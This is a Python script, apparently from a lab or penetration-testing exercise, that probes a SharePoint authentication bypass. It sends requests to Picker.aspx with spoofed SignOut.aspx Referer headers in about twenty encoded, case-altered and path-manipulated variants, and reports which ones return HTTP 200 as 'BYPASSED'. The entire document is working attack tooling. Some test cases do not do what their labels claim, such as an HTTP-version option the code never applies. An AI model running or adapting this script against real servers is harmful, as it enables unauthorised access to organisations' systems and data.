#!/usr/bin/env python3
# Purpose: Test edge cases and boundary conditions for auth bypass
# Outcome: Check null values, empty strings, special characters

import requests

target = "http://10.10.10.166"
test_endpoint = "/_layouts/15/Picker.aspx"

edge_case_tests = [
    # Null and empty Referer variations
    {
        "name": "Empty Referer header",
        "headers": {"Referer": ""}
    },
    {
        "name": "Whitespace-only Referer",
        "headers": {"Referer": "   "}
    },
    {
        "name": "Null byte in Referer",
        "headers": {"Referer": "/_layouts/SignOut.aspx\x00"}
    },
    {
        "name": "SignOut Referer with null byte in path",
        "headers": {"Referer": "/_layouts\x00/SignOut.aspx"}
    },
    
    # Case variations
    {
        "name": "UPPERCASE SignOut Referer",
        "headers": {"Referer": "/_LAYOUTS/SIGNOUT.ASPX"}
    },
    {
        "name": "MixedCase SignOut Referer",
        "headers": {"Referer": "/_LaYoUtS/SiGnOuT.aSpX"}
    },
    
    # URL encoding variations
    {
        "name": "URL-encoded SignOut path",
        "headers": {"Referer": "/%5flayouts%2fSignOut%2easpx"}
    },
    {
        "name": "Double URL-encoded",
        "headers": {"Referer": "/%255flayouts%252fSignOut%252easpx"}
    },
    {
        "name": "Unicode encoding in path",
        "headers": {"Referer": "/_layouts/SignOut\u002easpx"}
    },
    
    # Path manipulation
    {
        "name": "Backslash instead of forward slash",
        "headers": {"Referer": "\\_layouts\\SignOut.aspx"}
    },
    {
        "name": "Double slash in path",
        "headers": {"Referer": "//_layouts//SignOut.aspx"}
    },
    {
        "name": "Trailing slash",
        "headers": {"Referer": "/_layouts/SignOut.aspx/"}
    },
    {
        "name": "Dot segment in path",
        "headers": {"Referer": "/_layouts/./SignOut.aspx"}
    },
    {
        "name": "Multiple dot segments",
        "headers": {"Referer": "/_layouts/././SignOut.aspx"}
    },
    
    # Special characters
    {
        "name": "Semicolon before aspx",
        "headers": {"Referer": "/_layouts/SignOut;.aspx"}
    },
    {
        "name": "Question mark before aspx",
        "headers": {"Referer": "/_layouts/SignOut?.aspx"}
    },
    {
        "name": "Hash before aspx",
        "headers": {"Referer": "/_layouts/SignOut#.aspx"}
    },
    
    # Alternative SignOut paths
    {
        "name": "signout.aspx (lowercase) in /15/",
        "headers": {"Referer": "/_layouts/15/signout.aspx"}
    },
    {
        "name": "SignOut.aspx with version /14/",
        "headers": {"Referer": "/_layouts/14/SignOut.aspx"}
    },
    {
        "name": "SignOut.aspx with version /16/",
        "headers": {"Referer": "/_layouts/16/SignOut.aspx"}
    },
    
    # HTTP version variations
    {
        "name": "HTTP/1.0 protocol with SignOut Referer",
        "headers": {"Referer": "/_layouts/SignOut.aspx"},
        "http_version": "1.0"
    },
]

print("Testing Edge Cases and Boundary Conditions")
print("="*80)
print(f"Test Endpoint: {test_endpoint}")
print("="*80)

for test in edge_case_tests:
    url = f"{target}{test_endpoint}"
    
    try:
        response = requests.get(url, headers=test["headers"], allow_redirects=False, timeout=5)
        
        status = response.status_code
        if status == 401:
            result = "🔒 BLOCKED (401)"
        elif status == 403:
            result = "🔒 FORBIDDEN (403)"
        elif status == 200:
            result = "✅ BYPASSED (200)"
        elif status in [301, 302]:
            result = f"↪️  REDIRECT ({status})"
        elif status == 400:
            result = "⚠️  BAD REQUEST (400)"
        elif status == 500:
            result = "⚠️  ERROR (500)"
        else:
            result = f"❓ {status}"
        
        print(f"\n{test['name']}:")
        print(f"  Result: {result}")
        
    except Exception as e:
        print(f"\n{test['name']}:")
        print(f"  Result: ❌ ERROR - {str(e)[:50]}")

print("\n" + "="*80)
